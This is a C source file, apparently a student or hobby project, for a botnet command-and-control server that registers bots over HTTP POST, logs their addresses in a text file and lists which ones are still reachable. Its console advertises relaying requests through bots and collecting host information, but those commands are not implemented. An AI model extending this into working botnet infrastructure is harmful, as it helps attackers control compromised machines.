#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include "cJSON.h"
#include <time.h>
#include <pthread.h>
#include <netdb.h> // Per usare getaddrinfo

#define PORT 8081
#define MAX_REQUEST_SIZE 1024
#define TIMEOUT_SECONDS 5

struct Data {
    char clientIP[20];
    char ports[20][6];
};

void handle_get_request(int client_socket) {
    char response[] = "HTTP/1.1 200 OK\r\n"
                      "Content-Type: text/html\r\n\r\n"
                      "<html><body><h1>Hello, World!</h1></body></html>\r\n";
    send(client_socket, response, strlen(response), 0);
}

// Funzione per aggiornare il record del bot nel file "bots.txt"
void updateBotRecord(const char *clientIP, int port) {
    // Apri il file "bots.txt" in modalità append e lettura ("a+")
    FILE *file = fopen("bots.txt", "a+");
    if (file != NULL) {
        char line[1024];
        int found = 0;

        // Creare un nuovo file temporaneo
        FILE *tempFile = fopen("bots_temp.txt", "w");
        if (tempFile == NULL) {
            fclose(file);
            fprintf(stderr, "Errore nella creazione del file temporaneo 'bots_temp.txt'\n");
            return;
        }

        while (fgets(line, sizeof(line), file) != NULL) {
            char *timestamp = strtok(line, "|");
            char *address = strtok(NULL, "|");
            char *ports = strtok(NULL, "|");

            if (timestamp != NULL && address != NULL && ports != NULL) {
                if (strcmp(address, clientIP) == 0) {
                    // Trovato un record con lo stesso indirizzo IP, aggiorna la porta
                    found = 1;
                    time_t now;
                    time(&now);
                    struct tm *tm_info = localtime(&now);
                    char newTimestamp[20];
                    strftime(newTimestamp, sizeof(newTimestamp), "%Y-%m-%d %H:%M:%S", tm_info);
                    fprintf(tempFile, "%s|%s|%d\n", newTimestamp, clientIP, port);
                } else {
                    // Mantieni il record invariato
                    fprintf(tempFile, "%s|%s|%s", timestamp, address, ports);
                }
            }
        }

        if (!found) {
            // Se non è stato trovato un record corrispondente, aggiungilo
            time_t now;
            time(&now);
            struct tm *tm_info = localtime(&now);
            char timestamp[20];
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info);
            fprintf(tempFile, "%s|%s|%d\n", timestamp, clientIP, port);
        }

        // Chiudi entrambi i file
        fclose(file);
        fclose(tempFile);

        // Sostituisci il file originale con il file temporaneo
        if (remove("bots.txt") != 0) {
            fprintf(stderr, "Errore nella rimozione del file 'bots.txt'\n");
        }
        if (rename("bots_temp.txt", "bots.txt") != 0) {
            fprintf(stderr, "Errore nella sostituzione del file 'bots.txt'\n");
        }
    } else {
        fprintf(stderr, "Errore nell'apertura o creazione del file 'bots.txt'\n");
    }
}


void handle_post_request(int client_socket, char *data) {
//    printf("Received POST data: %s\n", data);

    cJSON *json = cJSON_Parse(data);
    if (json == NULL) {
        char response[] = "HTTP/1.1 400 Bad Request\r\n\r\n";
        send(client_socket, response, strlen(response), 0);
        return;
    }

    cJSON *clientIPItem = cJSON_GetObjectItem(json, "clientIP");
    cJSON *portsArray = cJSON_GetObjectItem(json, "ports");

    if (!cJSON_HasObjectItem(json, "clientIP") || !cJSON_HasObjectItem(json, "ports") || !cJSON_IsArray(portsArray)) {
        // Se uno dei campi non è presente o "ports" non è un array, gestisci l'errore
        cJSON_Delete(json);
        char response[] = "HTTP/1.1 400 Bad Request\r\n\r\n";
        send(client_socket, response, strlen(response), 0);
        return;
    }

    char *clientIP = strdup(clientIPItem->valuestring);


    // Dichiara una variabile per la porta
    int port;

    // Ottenere le porte dall'array cJSON
    for (int i = 0; i < cJSON_GetArraySize(portsArray); i++) {
        cJSON *portItem = cJSON_GetArrayItem(portsArray, i);
        if (cJSON_IsNumber(portItem)) {
            port = portItem->valueint;
            // Chiamata per aggiornare o aggiungere il record del bot
            updateBotRecord(clientIP, port);
        }
    }

    // Prepara la risposta JSON
    cJSON *responseJson = cJSON_CreateObject();
    cJSON_AddStringToObject(responseJson, "message", "ok");
    cJSON_AddNumberToObject(responseJson, "status", 200);
    char *responseJsonStr = cJSON_Print(responseJson);
    cJSON_Delete(responseJson);

    // Invia la risposta JSON
    char responseHeader[512];
    sprintf(responseHeader, "HTTP/1.1 200 OK\r\n"
                            "Content-Type: application/json\r\n"
                            "Content-Length: %lu\r\n\r\n", strlen(responseJsonStr));
    send(client_socket, responseHeader, strlen(responseHeader), 0);
    send(client_socket, responseJsonStr, strlen(responseJsonStr), 0);
    free(responseJsonStr);

    // Libera la memoria allocata per clientIP
    free(clientIP);
}

int isBotListening(const char *address, int port) {
    struct sockaddr_in server_addr;
    int sockfd;

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, address, &server_addr.sin_addr) <= 0) {
        return 0;  // Non in ascolto (errore nell'indirizzo IP)
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        return 0;  // Non in ascolto (errore nel socket)
    }

    // Imposta un timeout di 5 secondi
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
        close(sockfd);
        return 0;  // Non in ascolto (errore nel timeout)
    }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
        // Connessione riuscita, chiudi il socket e restituisci 1
        return 1;
    } else {
        close(sockfd);
        return 0;  // Non in ascolto (errore nella connessione)
    }
}

void printBotList() {
    // Apri il file "bots.txt" in modalità di lettura
    FILE *file = fopen("bots.txt", "r");
    if (file == NULL) {
        printf("No connected bots currently.\n");
        return;
    }

    char line[1024];
    char botAddresses[1024][1024];
    int botPorts[1024];
    int numBots = 0;

    // Leggi il file riga per riga
    while (fgets(line, sizeof(line), file) != NULL) {
        char *timestamp = strtok(line, "|");
        char *address = strtok(NULL, "|");
        char *ports = strtok(NULL, "|");

        if (timestamp != NULL && address != NULL && ports != NULL) {
            // Verifica se l'indirizzo IP è già presente nella lista
            int found = 0;
            for (int i = 0; i < numBots; i++) {
                if (strcmp(botAddresses[i], address) == 0) {
                    found = 1;
                    // Aggiorna la porta solo se è più recente
                    if (atoi(ports) > botPorts[i]) {
                        botPorts[i] = atoi(ports);
                    }
                    break;
                }
            }

            if (!found) {
                strcpy(botAddresses[numBots], address);
                botPorts[numBots] = atoi(ports);
                numBots++;
            }
        }
    }

    // Chiudi il file
    fclose(file);

    // Stampare la lista di indirizzi IP e porte più aggiornata
    int activeBotCount = 0;
    printf("List of active bots with the most updated port numbers:\n");
    for (int i = 0; i < numBots; i++) {
        if (isBotListening(botAddresses[i], botPorts[i])) {
            printf("%d) %s %d\n", activeBotCount + 1, botAddresses[i], botPorts[i]);
            activeBotCount++;
        }
    }

    if (activeBotCount == 0) {
        printf("No connected bots currently.\n");
    }
}

// Funzione del thread per la gestione dell'input dell'utente
void *user_input_thread(void *arg) {
    char command[1024];
    printf("Welcome to botnet!\n\nThis is a botnet simulator without any malicious purpose\n\nType 'list' for a detailed list of commands available\n\n");
    while (1) {
        printf("$ ");
        fflush(stdout);

        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;  // Termina il loop in caso di errore o fine dell'input
        }

        // list command
        if (strcmp(command, "list\n") == 0) {
            // Eseguire un'azione di uscita o terminare il server
            printf("1) botnet\n get the list of ip and ports of active bots with specific target id.\n\n2) request {hostname:port} {target}\n Send a request to a specified hostname and port via bot.\n\n3) get info {target}\n Receive hardware and software information about hosts connected to this botnet.\n\n");
        }
            // botnet command
        else if (strcmp(command, "botnet\n") == 0) {
            printBotList();
        }
            // exit command
        else if (strcmp(command, "exit\n") == 0) {
            // Eseguire un'azione di uscita o terminare il server
            exit(0);
        }
    }

    return NULL;
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    pthread_t user_input_thread_id; // ID del thread per la gestione dell'input dell'utente


    // Creazione del socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) {
        perror("Errore nella creazione del socket");
        exit(EXIT_FAILURE);
    }

    // Configurazione dell'indirizzo del server
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Binding del socket all'indirizzo del server
    if (bind(server_socket, (struct sockaddr *) &server_addr, sizeof(server_addr)) == -1) {
        perror("Errore nel binding del socket");
        exit(EXIT_FAILURE);
    }

    // Inizio ad ascoltare le connessioni in entrata
    if (listen(server_socket, 5) == -1) {
        perror("Errore nell'ascolto delle connessioni in entrata");
        exit(EXIT_FAILURE);
    }

    printf("Server start on port %d\n\n", PORT);

    // Creazione del thread per la gestione dell'input dell'utente
    if (pthread_create(&user_input_thread_id, NULL, user_input_thread, NULL) != 0) {
        perror("Errore nella creazione del thread per l'input dell'utente");
        exit(EXIT_FAILURE);
    }

    //Loop principale del server
    while (1) {
        // Accetto una connessione in entrata
        client_socket = accept(server_socket, (struct sockaddr *) &client_addr, &client_addr_len);
        if (client_socket == -1) {
            perror("Errore nell'accettare la connessione del client");
            continue;
        }

        char request[MAX_REQUEST_SIZE];
        memset(request, 0, sizeof(request));

        // Leggo la richiesta del client
        if (recv(client_socket, request, sizeof(request), 0) == -1) {
            perror("Errore nella lettura della richiesta del client");
            close(client_socket);
            continue;
        }

        if (strstr(request, "GET") != NULL) {
            handle_get_request(client_socket);
        } else if (strstr(request, "POST") != NULL) {
            // Trova i dati POST (supponendo una richiesta semplice senza chunking)
            char *data = strstr(request, "\r\n\r\n") + 4;
            handle_post_request(client_socket, data);
        } else {
            // Gestione di altri tipi di richieste
            char response[] = "HTTP/1.1 501 Not Implemented\r\n\r\n";
            send(client_socket, response, strlen(response), 0);
        }

        // Chiudi la connessione con il client
        close(client_socket);
    }

    // Chiudi il socket del server
    close(server_socket);
    // Join del thread per la gestione dell'input dell'utente
    if (pthread_join(user_input_thread_id, NULL) != 0) {
        perror("Errore nel join del thread per l'input dell'utente");
        exit(EXIT_FAILURE);
    }

    return 0;
}
